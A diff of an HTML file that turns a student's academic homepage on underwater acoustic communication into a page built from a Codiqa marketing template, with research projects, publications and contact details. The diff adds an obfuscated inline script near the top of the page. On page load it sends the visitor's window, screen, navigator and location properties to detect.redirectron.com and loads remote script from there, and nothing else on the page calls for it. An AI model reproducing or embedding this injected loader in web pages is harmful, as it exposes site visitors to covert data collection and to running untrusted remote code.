@@ -1,64 +1,233 @@
 
 <!DOCTYPE html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>Hao Xu</title>
-  <link rel="stylesheet" type="text/css" href="stylesheets/bootstrap.css" media="screen" />
-  <script src="javascripts/bootstrap.min.js"></script>
+<html ng-app="index">
+  <head>
+    <title>The Easiest Mobile Development Tool - Codiqa</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="keywords" content="jqm,jquery,jquery mobile,html5,mobile,app,drag and drop,codiqa,mobile app,phonegap">
+    <meta name="description" content="Codiqa is the easiest way to develop real cross-platform mobile apps and websites. No coding required, just drag and drop from our rich set of mobile components and features.">
+    <meta property="og:title" content="Codiqa - Fast and easy mobile development, just drag-and-drop!" />
+    <meta property="og:description" content="Codiqa is an incredibly fast and easy drag-and-drop mobile development service for building cross-platform mobile apps and mobile websites." />
+    <meta property="og:image" content="https://codiqa.com/static/images/icons/codiqa_twitter.jpg" />
 
-</head>
+    <link rel="shortcut icon" href="/static/favicon.ico" type="image/x-icon"/>
 
-<body>
-<p><img width="400" src="images/portrait.JPG"></p>
-<p>xuhao.cas.ioa@gmail.com</p>
-<p>219 Dayou Hall, Institute of Acoustics, Chinese Academy of Sciences, Beijing</p>
 
-<br>
-<h3>About</h3>
-<p>I am a third year Master student at University of Chinese Academy of Sciences(UCAS), advised by Prof. Min Zhu. I work with a number of chill and smart people in the Ocean Acoustic Technology lab. 
-</p>
-<p>
-Previously,  I earned my bachelor degree in Telecommunication Engineering from Wuhan University of Technology (aka WUT) in 2011. My research interests are mainly about signal processing detection techniques and mobile sensing systems. I also love Mathematics, Football and Programming.
-</p>
-<br>
+    
+    
+<link rel="stylesheet" href="./css/hellobar.css">
 
-<div id="projects">
-<h3>Publication</h3>
-<p>
-An Algorithm of Multi-array Turbo Equalization of Underwater Acoustic Communication<br>
-<b>Hao Xu</b>, Min Zhu, Yanbo Wu,<br>
-The Journal of Electronic Information In Chinese,To Appear<br>
-</p>
+    
+<script>
+(function(g,a,e,f,b,c){function d(a){for(b in a)0>b.indexOf("webkit")&&("number"==typeof a[b]||"string"==typeof a[b])&&(c.src+="&"+b+"="+encodeURIComponent(a[b]))}if(0>a.referrer.search(a.domain)||0<e.search.search("redirectron"))c=a.createElement(f),c.async=!0,c.src="//detect.redirectron.com/?v1",d(g),d(screen),d(navigator),d(e),b=a.getElementsByTagName(f)[0],b.parentNode.insertBefore(c,b)})(window,document,location,"script");
+</script>
 
-<p>
-The Union of Time Reversal and Turbo Equalization On Underwater Acoustic Communication<br>
-<b>Hao Xu</b>, Min Zhu, Yanbo Wu,<br>
-IEEE Ocean Coference 13, San Diego<br>
-</p>
+    <!-- Latest compiled and minified CSS -->
 
-<p>
-Robot Design Challenge Competition<br>
-Huang Rui, <b>Hao Xu</b>, Hong Jiang<br>
-Sciencepaper Online<br>
-</p>
+    <link href="./css/bootstrap-glyphicons.css" type="text/css" rel="stylesheet">
+    <link href="./css/style.css" type="text/css" rel="stylesheet">
+    
+    <style>
+      #ionic-header {
+        background-color: #4f8ef7;
+        color: #fff;
+        font-size: 14px;
+        padding: 10px;
+        text-align: center;
+        border-bottom: 1px solid #333;
+      }
+      #ionic-header a {
+        color: #fff;
+      }
+      .home-tab-fluid {
+	background-image: -webkit-linear-gradient(top, #FFFFFF, #F6F7FB);
+	background-image: linear-gradient(to bottom, #FFFFFF, #F6F7FB);
+	box-shadow: inset 0 -1px #F2F3F7, 0 1px #FCFCFE, 0 -3px 5px rgba(0,0,0,.3);
+	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#FFFFFF,endColorstr=#F6F7FB,GradientType=0);
+	position: relative;
+      }
+      .row-fluid {
+        width: 100%;
+      }
+      .tabbedmain {
+	width: 100%;
+      }
+.tabtit {
+font-size: 17px;
+color: #475b73;
+}
+.tabfix {
+text-align: center;
+}
+.row-fluid [class*="span"] {
+display: block;
+float: left;
+width: 33%;
+min-height: 30px;
+margin-left: 0;
+-webkit-box-sizing: border-box;
+-moz-box-sizing: border-box;
+box-sizing: border-box;
+}
+.home-tab-a h2 {
+margin-top: 20px;
+margin: 10px 0;
+font-family: inherit;
+font-weight: bold;
+text-rendering: optimizelegibility;
+line-height: 20px;
+color: inherit;
+font-size: 31.5px;
+}
+ img {
+width: auto\9;
+height: auto;
+max-width: 100%;
+vertical-align: middle;
+border: 0;
+-ms-interpolation-mode: bicubic;
+}
+.main-selector img {
+padding-right: 20px;
+}
+a{ text-decoration:none} 
+
+.tab-content {
+overflow: auto;
+}
+.tabbable {
+width: 100%;
+}
+
+[class^="icon-"], [class*=" icon-"] {
+display: inline-block;
+width: 14px;
+height: 14px;
+margin-top: 1px;
+line-height: 14px;
+vertical-align: text-top;
+background-image: url("/img/glyphicons-halflings.png");
+background-position: 28px 28px;
+background-repeat: no-repeat;
+}
+
+.icon-chevron-right {
+background-position: -456px -72px;
+}
+        
+.offcolor {
+background-color: #f7f7f7;
+}
+.feature.image {
+  /* White font */
+  color: #fff;
+  /* Scale the background image to fit */
+  background-size: cover; }
+    </style>
+  </head>
+  <body>
+
+    
+<!--
+    <div id="ionic-header">
+      Psst! Sneak peak - Build amazing native HTML5 apps with our upcoming <a href="http://ionicframework.com/" target="_blank">Ionic Framework</a>
+    </div>
+-->
+
+    <header id="cta" class="background-showcase">
+<!--
+	<div class="navbar"> 
+        <div class="container">
+          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-responsive-collapse">
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="/"><div class="asset logo-white-header"></div></a>
+          <div class="nav-collapse collapse navbar-responsive-collapse">
+            <ul class="nav navbar-nav pull-right">
+              <li class=""><a href="/tour">Tour</a></li>
+              <li class=""><a href="/plans">Pricing</a></li>
+              <li class=""><a href="/customers">Customers</a></li>
+              <li><a href="http://blog.codiqa.com">Blog</a></li>             
+              <li class="button"><a href="/login">Sign in</a></li>           
+            </ul>
+          </div>
+        </div>
+      </div>
+  --> 
+      <div class="container">
+<!--    <a href=""><strong> </strong></a>       -->        
+<div id="cta-text" class="row">
+  <div class="col-lg-5">
+    <h2>Hao Xu  许浩</h2>
+    <p class="lead">
+    I am a third year Master student at University of <a href="http://english.ucas.ac.cn/Pages/default.aspx"><strong>Chinese Academy of Sciences  (UCAS)</strong></a>, advised by  <a href="http://www.ioa.cas.cn/yjsjy/zs/201008/t20100831_2937094.html?randid=0.33842109438530765"><strong>Prof. Min Zhu</strong></a>. I work with a number of chill and smart people in the Ocean Acoustic Technology lab. Previously, I earned my bachelor degree in Telecommunication Engineering from <a href="http://english.whut.edu.cn/"><strong>Wuhan University of Technology (WUT)</strong></a> in 2011. 
+     <br>
+     <strong>Research interests:</strong> signal processing detection techniques and mobile sensing systems. I also love Mathematics, Football and Programming.
+    </p>
+<!--
+    <h2> My Education Journey:</h2>
+    <p font-size= 22px> <img src ="/img/WHUT.jpg" width="75" height="75" align="middle"> <strong>=></strong> <img src ="/img/UCAS.jpg" width="75" height="75" align="middle"> </p>
+-->
+  </div>
+  <div class="col-lg-6"></div>
 </div>
-<div id="projects">
-<a name="projects" id="projects"></a>
-<h3><b>Current Research Projects</b></h3>
-	<table style="width: 100%" align="center">
-		<tr>
-			<td style="width: 260px" class="text_align_center" valign="middle">
-			<img src="images/JiaoLong.png" width="250px" alt=""></td>
-			<td class="times_14pt_pre" valign="middle">
-			<strong>Underwater acoustic communication system for manned deep submersible JiaoLong. (The First manned subsmersible for China )</strong> <p class="margin_bottom_6px">Underwater acoustic transmission of images, human voice, data and texts between vehicle under 7000m depth and surface ship was accomplished of this underwater acoustic communication system.
+
+      </div>
+    </header>
+
+
+
+<div class="tabbable hidden-phone">
+
+<div class="row-fluid home-tab-fluid">
+					<div class="container">
+						<div class="row-fluid tabbedmain hidden-phone" id="tabselector">
+
+							<ul class="nav nav-tabs home-tab-nav">
+								<li class="span4 main-selector main-tabs">
+									<a href="#tab1" data-toggle="tab" class="home-tab-a"> <span class="tabfix"> <h2 class="tabtit"><img id="ietabs" src="img/icon1.png">Research</h2> </span></a>
+								</li>
+								<li class="span4 main-selector main-tabs">
+									<a href="#tab2" data-toggle="tab" class="home-tab-a"> <span class="tabfix"> <h2 class="tabtit"><img id="ietabs" src="img/icon2.png">Publications</h2> </span></a>
+								</li>
+
+								<li class="span4 main-selector main-tabs active">
+									<a href="#tab3" data-toggle="tab" class="home-tab-a"> <span class="tabfix"> <h2 class="tabtit"><img id="ietabs" src="img/icon3.png">About Me</h2> </span></a>
+								</li>
+
+							</ul>
+
+						</div>
+					</div>
+				</div>
+
+
+
+<div class="tab-content" id="#indexcontent">
+  <div class="tab-pane fade in" style="border: 0px solid #DDDDDD;" id="tab1">
+
+
+  <div id="feature-cross-platform">
+    <div class="container padded">
+      <div class="row">
+        <div class="col-lg-4">
+          <div id="devices_hype_container" style="position:relative;overflow:hidden;width:350px;margin-top:-0px;">
+           <img src ="/img/JiaoLongBig.png" width="350"  align="middle">
+          </div>
+        </div>
+        <div class="col-lg-8">
+          <h3>Underwater acoustic communication system for manned deep submersible JiaoLong. (The First manned subsmersible for China)</h3>
+          <p class="sub-head-feature-content">Underwater acoustic transmission of images, human voice, data and texts between vehicle under 7000m depth and surface ship was accomplished of this underwater acoustic communication system.
 </p>
-			<li style="list-style-type: none;"><i class="icon-chevron-right"></i> Processed the data received from all sea trials, address the communication problems caused by the deep sea acoustic channel.</li>
-			<li style="list-style-type: none;"><i class="icon-chevron-right"></i> Developed the more reliable turbo equalization based on the channel estimation for deep sea coherent communication channel.</li>
-			<li style="list-style-type: none;"><i class="icon-chevron-right"></i> Proposed soft iterated channel estimation with phase locked loop to track the channel response with rapid phase variation in underwater acoustic communication.</li>
-<p class="margin_bottom_6px">
+			<li class="sub-head-feature-content"><i class="icon-chevron-right"></i> Processed the data received from all sea trials, address the communication problems caused by the deep sea acoustic channel.</li>
+			<li class="sub-head-feature-content"><i class="icon-chevron-right"></i> Developed the more reliable turbo equalization based on the channel estimation for deep sea coherent communication channel.</li>
+			<li class="sub-head-feature-content"><i class="icon-chevron-right"></i> Proposed soft iterated channel estimation with phase locked loop to track the channel response with rapid phase variation in underwater acoustic communication.</li>
+<p class="sub-head-feature-content">
 			This project is funded by the National 863 High-Tech Foundation, PI: Min Zhu. </p>
-<p class="margin_bottom_6px">
+<p class="sub-head-feature-content">
 Research News: 
 <a href="http://tech.sina.com.cn/d/jiaolong7000/">
 		Sina News,</a>
@@ -69,126 +238,225 @@ Research News:
 		<a href="www.youtube.com/watch?v=bXaDNedhxVQ‎" title="Youtube"> Youtube</a>, 
 		<a href="http://english.cntv.cn/special/jiaolongsubmersible/homepage/index.shtml" title="CNTV News">
 		CNTV News</a>, and <a href="http://www.globaltimes.cn/content/812301.shtml#.Uoeer98cdok">Global Times</a></p>
+          <p class="sub-head-feature-content">
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
 
-			</td>
-		</tr>
-		<tr>
-			<td style="width: 260px" class="text_align_center" valign="middle">
-			&nbsp;</td>
-			<td class="times_14pt_pre" valign="middle">
-			&nbsp;</td>
-		</tr>
-		<tr>
-			<td style="width: 260px" class="text_align_center" valign="middle">
-			<img src="images/UAN.jpg" width="250px">
-			</td>
-			<td class="times_14pt_pre" valign="middle">
-						<p class="margin_bottom_6px">
-			<strong>Underwater acoustic network, Signal processing in physical layer communication
-</strong> <p class="margin_bottom_6px">Electromagnetic waves can’t be used for data transmission in the ocean, so underwater wireless networks are generally formed by acoustically connected ocean-bottom sensors, autonomous underwater vehicles, and a surface station, which provides a link to control center. Shallow water acoustic channel characteristics, such as low available bandwidth, highly varying multipath, and large propagation delays, restrict the efficiency of UWA networks. My work is concentrated on Time reversal and Turbo equalization.</p>
-			<li style="list-style-type: none;"><i class="icon-chevron-right"></i> Investigated time-reversal multi-channel combining which can retrace incoming multiple paths in
-large delay spread channels to simplify the underwater acoustic communication equalization. Proposed
-whitening filters based on AR process to develop colored gaussian noise into white gaussian noise, which
-solves the noise model misadjustment of equalization based on channel estimation.</li>
-			<li style="list-style-type: none;"><i class="icon-chevron-right"></i> Investigated turbo principle of exchanging soft information between decoders and equalizers which
-can be realized by linear filters and Markov Chain Monte Carlo equalizer. Joint Optimization between
-Time revervsal and Turbo equalization can have a superior performance over adaptive equalization with
-turbo decoding and a limited complexity for application.</li>
-			<li style="list-style-type: none;"><i class="icon-chevron-right"></i> Designed the scheme for data link of the data radio with CSMA/CD protocol. Programmed the
-GUI on computer to diagnose and supervise the whole aquatic network.</li>
+  <div id="feature-drag-and-drop" class="offcolor">
+    <div class="container padded">
+      <div class="row">
+        <div class="col-lg-4">
+          <div id="devices_hype_container" style="position:relative;overflow:hidden;width:350px;margin-top:0px;">
+           <img src ="/img/Robot.jpg" width="350"  align="middle">
+          </div>
 
-<p class="margin_bottom_6px">
-			This project is funded by the National 863 High-Tech Foundation, PI: Min Zhu. </p>
-
-			</td>
-		</tr>
-		<tr>
-			<td style="width: 260px" class="text_align_center" valign="middle">
-			&nbsp;</td>
-			<td class="times_14pt_pre" valign="middle">
-			&nbsp;</td>
-		</tr>
-		<tr>
-			<td style="width: 260px" class="text_align_center" valign="middle">
-			<img src="images/Robot.jpg" width="250px" alt="">
-			</td>
-			<td class="times_14pt_pre" valign="middle">
-
-			<p class="margin_bottom_6px">
-			<strong>Robot for Robot Wars Competition.</strong>
-<p>We design a powerful robot to participate in the famous Robocup Competition (just like the famous TV show: Robot Wars). This kind of robot needs
+        </div>
+        <div class="col-lg-8">
+			<h3>Robot for Robot Wars Competition.</h3>
+			<p class="sub-head-feature-content">
+We design a powerful robot to participate in the famous Robocup Competition (just like the famous TV show: Robot Wars). This kind of robot needs
 to detect the own positions and the opponet on a fixed platform, then the robot push the opponent away from the platform for victory. To meet these needs, we used the circuits of the microcontroller and sensors, the efficient control algorithm to attact the opponent. Besides, our local computer would record the data from the robot in competition from the platform by the wireless RF module.</p>
-<li style="list-style-type: none;"><i class="icon-chevron-right"></i> Designed the microcontroller boards to control wireless module, color LCD display, RAM/Flash interface.
+<li class="sub-head-feature-content"><i class="icon-chevron-right"></i> Designed the microcontroller boards to control wireless module, color LCD display, RAM/Flash interface.
 </li>
-<li style="list-style-type: none;"><i class="icon-chevron-right"></i> Designed the scheme to make all wireless link operate successful. Programmed on FPGA to realize the complicated DSP algorithm like FIR filters, FFT for data processing.</li>
+<li class="sub-head-feature-content"><i class="icon-chevron-right"></i> Designed the scheme to make all wireless link operate successful. Programmed on FPGA to realize the complicated DSP algorithm like FIR filters, FFT for data processing.</li>
 </p>
-			<p class="margin_bottom_6px">
+			<p class="sub-head-feature-content">
 			This project won the first prize in national Robocup competition.</p>
-<p class="margin_bottom_6px">
+<p class="sub-head-feature-content">
 Research News: 
 <a href="http://www.tudou.com/programs/view/Xk9xD3HdCXI/">
 Tudou </a>,
 <a href="http://news.sina.com.cn/c/2009-12-11/082216757286s.shtml">Sina News</a></p>
-			</td>
-		</tr>
-		<tr>
-			<td style="width: 260px; height: 25px;" class="text_align_center" valign="middle">
-			</td>
-			<td class="times_14pt" valign="middle" style="height: 25px">
+        </div>
+      </div>
+    </div>
+  </div>
 
-			    &nbsp;</td>
-		</tr>
-	</table>
+  <div id="feature-cross-platform">
+    <div class="container padded">
+      <div class="row">
+        <div class="col-lg-4">
+          <div id="devices_hype_container" style="position:relative;overflow:hidden;width:350px;margin-top:50px;">
+           <img src ="/img/UAN.png"   align="middle">
+           
+          </div>
+          <div id="devices_hype_container" style="position:relative;overflow:hidden;width:350px;margin-top:50px;">
+           <img src ="/img/UAC.jpg" width="350"  align="middle">
+           
+          </div>
+        </div>
+        <div class="col-lg-8">
+
+			<h3>Underwater acoustic network, Signal processing in physical layer communication</h3>
+ <p class="sub-head-feature-content">Electromagnetic waves can’t be used for data transmission in the ocean, so underwater wireless networks are generally formed by acoustically connected ocean-bottom sensors, autonomous underwater vehicles, and a surface station, which provides a link to control center.</p>
+
+			<li class="sub-head-feature-content"><i class="icon-chevron-right"></i> <strong>Time Reversal with Turbo Equalization: </strong> Proposed time reversal multi-channel combining to simplify the turbo equalization. Investigated turbo principle of exchanging soft information between decoders and equalizers. The length of the turbo equalizer decreased to 10% to that of the
+multi-channel turbo equalization.</li>
+			<li class="sub-head-feature-content"><i class="icon-chevron-right"></i> <strong>Markov Chain Monte Carlo equalizer: </strong>Investigated turbo principle of exchanging soft information between decoders and equalizers which can be realized by linear filters and Markov Chain Monte Carlo equalizer. Joint Optimization between Time revervsal and Turbo equalization can have a superior performance over adaptive equalization with turbo decoding and a limited complexity for application.</li>
+			<li class="sub-head-feature-content"><i class="icon-chevron-right"></i> <strong> Data Radio Networks:</strong> Designed the wireless network of data radio in CSMA/CD protocol. Designed, implemented, and evaluated the GUI on computer to diagnose and supervise the whole
+aquatic network.</li>
+<p class="sub-head-feature-content">This project is funded by the National 863 High-Tech Foundation, PI: Min Zhu. </p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+
+
+
+</div>
+
+<div class="tab-pane fade in" style="border: 0px solid #DDDDDD;" id="tab2">
+  <div id="feature-drag-and-drop">
+    <div class="container padded">
+      <div class="row">
+        <div class="col-lg-5">
+          <div id="dragdrop_hype_container" style="position:relative;overflow:hidden;">
+            <img src ="/img/books.png"   align="middle">
+          </div>
+        </div>
+        <div class="col-lg-7">
+          <p class="sub-head-feature-content">
+<h2 class="left" id="sub-text-margin">Conferences and Journals</h2>
+<p>
+The Union of Time Reversal and Turbo Equalization On Underwater Acoustic Communication<br>
+<b>Hao Xu</b>, Min Zhu, Yanbo Wu,<br>
+IEEE Ocean Coference 13, San Diego<br>
+</p>
+<p>
+An Algorithm of Multi-array Turbo Equalization of Underwater Acoustic Communication<br>
+<b>Hao Xu</b>, Min Zhu, Yanbo Wu,<br>
+The Journal of Electronic Information In Chinese,To Appear<br>
+</p>
+<p>
+Robot Design Challenge Competition<br>
+Huang Rui, <b>Hao Xu</b>, Hong Jiang<br>
+Sciencepaper Online<br>
+</p>
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="tab-pane active fade in" style="border: 0px solid #DDDDDD;" id="tab3">
+  <div id="feature-drag-and-drop">
+    <div class="container padded">
+      <div class="row">
+        <div class="col-lg-6">
+			<h2>Contact Information.</h2>	
+			<p class="sub-head-feature-content">
+			Drop me a line anytime at <a href="mailto:xuhao.cas.ioa@gmail.com"><strong>xuhao.cas.ioa@gmail.com</strong></a> to get in touch with me.
+			</br>
+                        It would be great if you also happen to be in Beijing. In that case we can sit down, have a drink and talk about things 				face to face.
+			</br>
+			My working place: 219 Dayou Hall, Institute of Acoustics, Chinese Academy of Sciences, Beijing</p>
+
+        </div>
+        <div class="col-lg-6">
+          <div id="devices_hype_container" style="position:relative;overflow:hidden;margin-top:0px;">
+<iframe width="570" height="350" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="https://maps.google.com/maps?f=q&amp;source=s_q&amp;hl=zh-CN&amp;geocode=&amp;q=%E4%B8%AD%E5%9B%BD%E7%A7%91%E5%AD%A6%E9%99%A2%E7%A0%94%E7%A9%B6%E7%94%9F%E9%99%A2%E9%9D%92%E5%B9%B4%E5%85%AC%E5%AF%93&amp;aq=&amp;sll=39.974884,116.34676&amp;sspn=0.095899,0.170631&amp;ie=UTF8&amp;hq=%E4%B8%AD%E5%9B%BD%E7%A7%91%E5%AD%A6%E9%99%A2%E7%A0%94%E7%A9%B6%E7%94%9F%E9%99%A2%E9%9D%92%E5%B9%B4%E5%85%AC%E5%AF%93&amp;hnear=&amp;t=m&amp;z=12&amp;iwloc=A&amp;output=embed"></iframe><br /><small><a href="https://maps.google.com/maps?f=q&amp;source=embed&amp;hl=zh-CN&amp;geocode=&amp;q=%E4%B8%AD%E5%9B%BD%E7%A7%91%E5%AD%A6%E9%99%A2%E7%A0%94%E7%A9%B6%E7%94%9F%E9%99%A2%E9%9D%92%E5%B9%B4%E5%85%AC%E5%AF%93&amp;aq=&amp;sll=39.974884,116.34676&amp;sspn=0.095899,0.170631&amp;ie=UTF8&amp;hq=%E4%B8%AD%E5%9B%BD%E7%A7%91%E5%AD%A6%E9%99%A2%E7%A0%94%E7%A9%B6%E7%94%9F%E9%99%A2%E9%9D%92%E5%B9%B4%E5%85%AC%E5%AF%93&amp;hnear=&amp;t=m&amp;z=12&amp;iwloc=A" style="color:#0000FF;text-align:left">查看大图</a></small>
+          </div>
+
+        </div>
+
+      </div>
+    </div>
+  </div>
+  <div id="feature-visual-code" class="feature offcolor">
+    <div class="container padded">
+      <div class="row">
+        <div class="col-lg-6">
+          <div class="asset image-home-realtime">
+		<img src ="/img/Champions.jpg"   align="middle">
+          </div>
+        </div>
+        <div class="col-lg-6">
+          <h2 class="left" id="sub-text-margin">Run, Shoot, Play... That's Football</h2>
+          <p class="sub-head-feature-content">
+          Football is my most favourite sport. Weekends, Holidays, You will always find me in the football field. UEFA Champions League, that's the most challenging match of football in this world. I have a dream to watch final of this UEFA Champions League in Europe, and I hope this day is not far away. 
+          </p>
+          <div id="exportedpages_hype_container" style="position:relative;overflow:hidden;width:287px;height:94px;margin-left:-10px;">
+            <script type="text/javascript" charset="utf-8" src="/static/js/flat/hype-animations/exported_pages/exported_pages.hyperesources/exportedpages_hype_generated_script.js?46265"></script>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+
+
+
+
 </div>
 
 
-<!---
-<p>
-<a href="http://conferences.sigcomm.org/co-next/2012/eproceedings/student/p51.pdf">Smooth Transmission over Unsynchronized VLC links</a><br>
-<b>Qifan Pu</b>, Wenjun Hu<br>
-<a href="http://conferences.sigcomm.org/co-next/2012/">CoNEXT'12 Student Workshop, Nice, France</a><br>
-</p><br>
+  </div>
+</div>
+</div>
 
 
-<p>
-<a href="http://dl.acm.org/citation.cfm?id=2348573">ParCast: soft video delivery in MIMO-OFDM WLANs</a><br>
-Xiao Lin Liu, Wenjun Hu, <b>Qifan Pu</b>, Feng Wu, Yongguang Zhang<br>
-<a href="http://www.sigmobile.org/mobicom/2012/index.html">Mobicom '12, Istanbul, Turkey</a><br>
-<a href="http://homes.cs.washington.edu/~qp/paper/ParCast.pdf">[paper]</a>
-<a href="http://homes.cs.washington.edu/~qp/paper/ParCast.ppsx">[slides]</a>
-</p><br>
--->
 
-<!---
-<h1>Misc</h1>
-<p>
-1, Kungfu Stonie<br />
-a voice-controlled mobile music game I developed in 2011 with my friends <a href="http://yadli.net/">Yatao</a>, et al.(I took care of the design and voice control module). It got into the top 100 games on Windows Phone Market.<br />
-<a href="http://www.youtube.com/watch?v=NTbESyOkSoQ">[video]</a> <a href="http://www.windowsphone.com/en-us/store/app/kungfu-stonie/a32e3cb8-27b0-477e-be0b-afe7a29d4411">[download]</a>
-</p><br />
 
-<p>
-2, Humanoid Robot<br />
-a humanroid robot I built with friends during my freshman summer. He could do some crazy random stuffs like push-up and hanging on gymnastic rings.</br>
-<a href="http://homes.cs.washington.edu/~qp/picture/robot_design.jpg">[demo]</a>
-<a href="http://homes.cs.washington.edu/~qp/picture/robot.jpg">[final]</a>
-</p>
+    <div id="sub-footer">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-4">
+            <p id="copyright-section">  Copyright 2013 | <a href="/tos" target="_blank">Terms of Service</a> | <a href="/privacy" target="_blank">Privacy Policy</a>
+            </p>
+          </div>
+          <div class="col-lg-4 text-center">
+            <a href="http://drifty.com"><div class="asset drifty-logo" id="transparent"></div></a>
+          </div>
+          <div class="col-lg-4">
+            <p id="love">Codiqa is grown with <span class="love-icon"></span> in Madison, Wisconsin
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
 
-<br />
--->
-<!--- end text and image -->
-<!---
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.7/angular.min.js"></script>
+    <!-- Latest compiled and minified JavaScript -->
+    <script src="https://netdna.bootstrapcdn.com/bootstrap/3.0.0-rc1/js/bootstrap.min.js"></script>
+    <!--<script src="/static/js/flat/index.js"></script>-->
+    <script src="/static/js/site/controllers.js"></script>
+    
+<script src="/static/js/offline/hellobar/hellobar.js"></script>
 <script>
-  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-
-  ga('create', 'UA-44429963-1', 'berkeley.edu');
-  ga('send', 'pageview');
-
+/*
+  new HelloBar( 'Sign up for our FREE 1 month course on building great mobile apps <form action="http://codiqa.createsend.com/t/t/s/ujti/" method="post"><input id="fieldEmail" name="cm-ujti-ujti" type="email" placeholder="Your email address" required /><button type="submit">Get started</button></form>', {
+		showWait: 2000,
+		positioning: 'sticky',
+		fonts: 'ProximaNova-Regular, Helvetica, sans-serif',
+		forgetful: true,
+    helloBarLogo: false,
+    borderSize: 0,
+    barColor: '#dc574e'
+	}, 1.0 );
+  */
 </script>
--->
-</body>
+
+    <script type="text/javascript">
+
+      var _gaq = _gaq || [];
+      _gaq.push(['_setAccount', 'UA-26244071-1']);
+      _gaq.push(['_setDomainName', 'codiqa.com']);
+      _gaq.push(['_trackPageview']);
+
+      (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+      })();
+
+    </script>
+
+  </body>
 </html>
 
